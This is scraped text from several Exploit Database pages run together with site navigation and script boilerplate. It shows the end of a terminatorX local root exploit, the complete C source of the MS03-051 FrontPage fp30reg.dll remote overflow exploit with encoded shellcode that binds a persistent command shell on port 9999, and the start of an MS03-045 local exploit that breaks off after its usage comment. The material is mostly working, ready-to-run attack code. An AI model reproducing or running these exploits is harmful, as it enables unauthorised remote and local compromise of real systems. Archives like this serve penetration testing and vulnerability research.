-1 ) {fprintf(stderr,"[-] %s: wait()\n", strerror(errno));return 1;} else if ( wpid != pid )abort();else {if ( WIFEXITED(status) ) {printf("[+] Exited: shell's ret code = %d\n", WEXITSTATUS(status));return WEXITSTATUS(status);} else if ( WIFSIGNALED(status) ) {return WTERMSIG(status);} else {fprintf(stderr, "[-] Stopped.\n");}}}return 1;}intmake_string(long ret_addr){int i;long ret,addr,*addr_ptr;buffer = (char *)malloc(512);if(!buffer){fprintf(stderr,"[-] Can't allocate memory, exiting...\n");exit(-1);}ret = ret_addr;ptr = buffer;memset(ptr,0x90,BSIZE-strlen(shellcode));ptr += BSIZE-strlen(shellcode);for(i=0;i<strlen(shellcode);i++)*ptr++ = shellcode[i];addr_ptr = (long *)ptr;for(i=0;i<20;i++)*(addr_ptr++) = ret;ptr = (char *)addr_ptr;*ptr = 0;return 0;}intbruteforce(long start){int ret;long i;fprintf(stdout,"[+] Starting bruteforcing...\n");for(i=start;i<0;i=i-50){fprintf(stdout,"[+] Testing 0x%x...\n",i);make_string(i);ret=tease();if(ret==0){fprintf(stdout,"[+] Ret address found: 0x%x\n",i);break;}}return 0;}voidbanner(char *argv0){fprintf(stderr,"\n exploit: terminatorX V. <= 3.81 local root exploit by Li0n7\n");fprintf(stderr," discoverer: c0wb0y (www.0x333.org)\n");fprintf(stderr," visit us: http://www.ioc.fr.st\n");fprintf(stderr," contact me: Li0n7[at]voila[dot]fr\n");fprintf(stderr," usage: %s [-r <RET>][-b [-s <STARTING_RET>]]\n\n",argv0);}intmain(int argc,char *argv[]){char * option_list = "br:s:";int option,brute = 0, opterr = 0;long ret,start = D_START;banner(argv[0]);if (argc < 1) exit(-1);while((option = getopt(argc,argv,option_list)) != -1)switch(option){case 'b':brute = 1;break;case 'r':ret = strtoul(optarg,NULL,0);make_string(ret);tease();exit(0);break;case 's':start = strtoul(optarg,NULL,0);break;case '?':fprintf(stderr,"[-] option \'%c\' invalid\n",optopt);banner(argv[0]);exit(-1);}if(brute)bruteforce(start);return 0;}// milw0rm.com [2003-11-13]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 121
Microsoft FrontPage Server Extensions - 'fp30reg.dll' (MS03-051) - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft FrontPage Server Extensions - 'fp30reg.dll' (MS03-051)EDB-ID:121CVE:2003-0822EDB Verified:Author:AdikType:remoteExploit:/Platform:WindowsDate:2003-11-13Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*******************************************************************************Frontpage fp30reg.dll Overflow (MS03-051) discovered by Brett MooreExploit by Adik netmaniac hotmail kgBinds persistent command shell on port 9999Tested onWindows 2000 Professional SP3 English version(fp30reg.dll ver 4.0.2.5526)-[ 13/Nov/2003 ]-********************************************************************************/#include <stdio.h>#include <string.h>#include <winsock.h>#pragma comment(lib,"ws2_32")#define VER		"0.1"/******** bind shellcode spawns persistent shell on port 9999 *****************************/unsigned char kyrgyz_bind_code[] = {0xEB, 0x03, 0x5D, 0xEB, 0x05, 0xE8, 0xF8, 0xFF, 0xFF, 0xFF, 0x8B, 0xC5, 0x83, 0xC0, 0x11, 0x33,0xC9, 0x66, 0xB9, 0xC9, 0x01, 0x80, 0x30, 0x88, 0x40, 0xE2, 0xFA,0xDD, 0x03, 0x64, 0x03, 0x7C, 0x09, 0x64, 0x08, 0x88, 0x88, 0x88, 0x60, 0xC4, 0x89, 0x88, 0x88,0x01, 0xCE, 0x74, 0x77, 0xFE, 0x74, 0xE0, 0x06, 0xC6, 0x86, 0x64, 0x60, 0xD9, 0x89, 0x88, 0x88,0x01, 0xCE, 0x4E, 0xE0, 0xBB, 0xBA, 0x88, 0x88, 0xE0, 0xFF, 0xFB, 0xBA, 0xD7, 0xDC, 0x77, 0xDE,0x4E, 0x01, 0xCE, 0x70, 0x77, 0xFE, 0x74, 0xE0, 0x25, 0x51, 0x8D, 0x46, 0x60, 0xB8, 0x89, 0x88,0x88, 0x01, 0xCE, 0x5A, 0x77, 0xFE, 0x74, 0xE0, 0xFA, 0x76, 0x3B, 0x9E, 0x60, 0xA8, 0x89, 0x88,0x88, 0x01, 0xCE, 0x46, 0x77, 0xFE, 0x74, 0xE0, 0x67, 0x46, 0x68, 0xE8, 0x60, 0x98, 0x89, 0x88,0x88, 0x01, 0xCE, 0x42, 0x77, 0xFE, 0x70, 0xE0, 0x43, 0x65, 0x74, 0xB3, 0x60, 0x88, 0x89, 0x88,0x88, 0x01, 0xCE, 0x7C, 0x77, 0xFE, 0x70, 0xE0, 0x51, 0x81, 0x7D, 0x25, 0x60, 0x78, 0x88, 0x88,0x88, 0x01, 0xCE, 0x78, 0x77, 0xFE, 0x70, 0xE0, 0x2C, 0x92, 0xF8, 0x4F, 0x60, 0x68, 0x88, 0x88,0x88, 0x01, 0xCE, 0x64, 0x77, 0xFE, 0x70, 0xE0, 0x2C, 0x25, 0xA6, 0x61, 0x60, 0x58, 0x88, 0x88,0x88, 0x01, 0xCE, 0x60, 0x77, 0xFE, 0x70, 0xE0, 0x6D, 0xC1, 0x0E, 0xC1, 0x60, 0x48, 0x88, 0x88,0x88, 0x01, 0xCE, 0x6A, 0x77, 0xFE, 0x70, 0xE0, 0x6F, 0xF1, 0x4E, 0xF1, 0x60, 0x38, 0x88, 0x88,0x88, 0x01, 0xCE, 0x5E, 0xBB, 0x77, 0x09, 0x64, 0x7C, 0x89, 0x88, 0x88, 0xDC, 0xE0, 0x89, 0x89,0x88, 0x88, 0x77, 0xDE, 0x7C, 0xD8, 0xD8, 0xD8, 0xD8, 0xC8, 0xD8, 0xC8, 0xD8, 0x77, 0xDE, 0x78,0x03, 0x50, 0xDF, 0xDF, 0xE0, 0x8A, 0x88, 0xAF, 0x87, 0x03, 0x44, 0xE2, 0x9E, 0xD9, 0xDB, 0x77,0xDE, 0x64, 0xDF, 0xDB, 0x77, 0xDE, 0x60, 0xBB, 0x77, 0xDF, 0xD9, 0xDB, 0x77, 0xDE, 0x6A, 0x03,0x58, 0x01, 0xCE, 0x36, 0xE0, 0xEB, 0xE5, 0xEC, 0x88, 0x01, 0xEE, 0x4A, 0x0B, 0x4C, 0x24, 0x05,0xB4, 0xAC, 0xBB, 0x48, 0xBB, 0x41, 0x08, 0x49, 0x9D, 0x23, 0x6A, 0x75, 0x4E, 0xCC, 0xAC, 0x98,0xCC, 0x76, 0xCC, 0xAC, 0xB5, 0x01, 0xDC, 0xAC, 0xC0, 0x01, 0xDC, 0xAC, 0xC4, 0x01, 0xDC, 0xAC,0xD8, 0x05, 0xCC, 0xAC, 0x98, 0xDC, 0xD8, 0xD9, 0xD9, 0xD9, 0xC9, 0xD9, 0xC1, 0xD9, 0xD9, 0x77,0xFE, 0x4A, 0xD9, 0x77, 0xDE, 0x46, 0x03, 0x44, 0xE2, 0x77, 0x77, 0xB9, 0x77, 0xDE, 0x5A, 0x03,0x40, 0x77, 0xFE, 0x36, 0x77, 0xDE, 0x5E, 0x63, 0x16, 0x77, 0xDE, 0x9C, 0xDE, 0xEC, 0x29, 0xB8,0x88, 0x88, 0x88, 0x03, 0xC8, 0x84, 0x03, 0xF8, 0x94, 0x25, 0x03, 0xC8, 0x80, 0xD6, 0x4A, 0x8C,0x88, 0xDB, 0xDD, 0xDE, 0xDF, 0x03, 0xE4, 0xAC, 0x90, 0x03, 0xCD, 0xB4, 0x03, 0xDC, 0x8D, 0xF0,0x8B, 0x5D, 0x03, 0xC2, 0x90, 0x03, 0xD2, 0xA8, 0x8B, 0x55, 0x6B, 0xBA, 0xC1, 0x03, 0xBC, 0x03,0x8B, 0x7D, 0xBB, 0x77, 0x74, 0xBB, 0x48, 0x24, 0xB2, 0x4C, 0xFC, 0x8F, 0x49, 0x47, 0x85, 0x8B,0x70, 0x63, 0x7A, 0xB3, 0xF4, 0xAC, 0x9C, 0xFD, 0x69, 0x03, 0xD2, 0xAC, 0x8B, 0x55, 0xEE, 0x03,0x84, 0xC3, 0x03, 0xD2, 0x94, 0x8B, 0x55, 0x03, 0x8C, 0x03, 0x8B, 0x4D, 0x63, 0x8A, 0xBB, 0x48,0x03, 0x5D, 0xD7, 0xD6, 0xD5, 0xD3, 0x4A, 0x8C, 0x88};void cmdshell (int sock);long gimmeip(char *hostname);int main(int argc,char *argv[]){WSADATA wsaData;struct sockaddr_in targetTCP;struct hostent *host;int sockTCP,s;unsigned short port = 80;long ip;unsigned char header[]=	"POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1\r\n";unsigned char packet[3000],data[1500];unsigned char ecx[] = "\xe0\xf3\xd4\x67";unsigned char edi[] = "\xff\xd0\x90\x90";unsigned char call[] = "\xe4\xf3\xd4\x67";//overwrite .data section of fp30reg.dllunsigned char shortjmp[] = "\xeb\x10";printf("\n-={ Frontpage fp30reg.dll Overflow Exploit (MS03-051) ver %s }=-\n\n"" by Adik < netmaniac [at] hotmail.KG >\n\n", VER);if(argc < 2){printf(" Usage: %s [Target] <port>\n"" eg: fp30reg.exe 192.168.63.130\n\n",argv[0]);return 1;}if(argc==3)port = atoi(argv[2]);WSAStartup(0x0202, &wsaData);printf("[*] Target:\t%s \tPort: %d\n\n",argv[1],port);ip=gimmeip(argv[1]);memset(&targetTCP, 0, sizeof(targetTCP));memset(packet,0,sizeof(packet));targetTCP.sin_family = AF_INET;targetTCP.sin_addr.s_addr = ip;targetTCP.sin_port = htons(port);sprintf(packet,"%sHost: %s\r\nTransfer-Encoding: chunked\r\n",header,argv[1]);memset(data, 0x90, sizeof(data)-1);data[sizeof(data)-1] = '\x0';memcpy(&data[16],edi,sizeof(edi)-1);memcpy(&data[20],ecx,sizeof(ecx)-1);memcpy(&data[250+10],shortjmp,sizeof(shortjmp)-1);memcpy(&data[250+14],call,sizeof(call)-1);memcpy(&data[250+70],kyrgyz_bind_code,sizeof(kyrgyz_bind_code));sprintf(packet,"%sContent-Length: %d\r\n\r\n%x\r\n%s\r\n0\r\n\r\n",packet,strlen(data),strlen(data),data);if ((sockTCP = socket(AF_INET, SOCK_STREAM, 0)) == -1){printf("[x] Socket not initialized! Exiting...\n");WSACleanup();return 1;}printf("[*] Socket initialized...\n");if(connect(sockTCP,(struct sockaddr *)&targetTCP, sizeof(targetTCP)) != 0){printf("[*] Connection to host failed! Exiting...\n");WSACleanup();exit(1);}printf("[*] Checking for presence of fp30reg.dll...");if (send(sockTCP, packet, strlen(packet),0) == -1){printf("[x] Failed to inject packet! Exiting...\n");WSACleanup();return 1;}memset(packet,0,sizeof(packet));if (recv(sockTCP, packet, sizeof(packet),0) == -1){printf("[x] Failed to receive packet! Exiting...\n");WSACleanup();return 1;}if(packet[9]=='1' && packet[10]=='0' && packet[11]=='0')printf(" Found!\n");else{printf(" Not Found!! Exiting...\n");WSACleanup();return 1;}printf("[*] Packet injected!\n");closesocket(sockTCP);printf("[*] Sleeping ");for(s=0;s<13000;s+=1000){printf(". ");Sleep(1000);}printf("\n[*] Connecting to host: %s on port 9999",argv[1]);if ((sockTCP = socket(AF_INET, SOCK_STREAM, 0)) == -1){printf("\n[x] Socket not initialized! Exiting...\n");WSACleanup();return 1;}targetTCP.sin_family = AF_INET;targetTCP.sin_addr.s_addr = ip;targetTCP.sin_port = htons(9999);if(connect(sockTCP,(struct sockaddr *)&targetTCP, sizeof(targetTCP)) != 0){printf("\n[x] Exploit failed or there is a Firewall! Exiting...\n");WSACleanup();exit(1);}printf("\n[*] Dropping to shell...\n\n");cmdshell(sockTCP);return 0;}/*********************************************************************************/void cmdshell (int sock){struct timeval tv;int length;unsigned long o[2];char buffer[1000];tv.tv_sec = 1;tv.tv_usec = 0;while (1){o[0] = 1;o[1] = sock;length = select (0, (fd_set *)&o, NULL, NULL, &tv);if(length == 1){length = recv (sock, buffer, sizeof (buffer), 0);if (length <= 0){printf ("[x] Connection closed.\n");WSACleanup();return;}length = write (1, buffer, length);if (length <= 0){printf ("[x] Connection closed.\n");WSACleanup();return;}}else{length = read (0, buffer, sizeof (buffer));if (length <= 0){printf("[x] Connection closed.\n");WSACleanup();return;}length = send(sock, buffer, length, 0);if (length <= 0){printf("[x] Connection closed.\n");WSACleanup();return;}}}}/*********************************************************************************/long gimmeip(char *hostname){struct hostent *he;long ipaddr;if ((ipaddr = inet_addr(hostname)) < 0){if ((he = gethostbyname(hostname)) == NULL){printf("[x] Failed to resolve host: %s! Exiting...\n\n",hostname);WSACleanup();exit(1);}memcpy(&ipaddr, he->h_addr, he->h_length);}return ipaddr;}/*********************************************************************************/// milw0rm.com [2003-11-13]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 122
Microsoft Windows - ListBox/ComboBox Control Local (MS03-045) - Windows local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Windows - ListBox/ComboBox Control Local (MS03-045)EDB-ID:122CVE:2003-0659EDB Verified:Author:xCrZxType:localExploit:/Platform:WindowsDate:2003-11-14Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*\	local ListBox/ComboBox exploit for Win32/\	Created by xCrZx crazy_einstein yahoo com /11.11.03//\	Usage: MS03-045.exe <-t target> [-r return address]/\	there is two targets: CB_DIR (for ComboBox), LB_DIR (for ListBox)./\	As to return address it should be such as 0x0000XXYY/	(and you should know that this address will be transformed\	into unicode! And if XX and YY bytes <128 it will maintained!/	And return address will be such as 0x00XX00YY!\	If not it will be coded in two bytes each of this bytes and/	return will be looked like 0xZZZZWWWW)\/	To figure out handle addresses you can use tools such as\	Spy++ (default tool contained in MSVC++ 6.0)/\	Note: 	there is no so easy exploitation 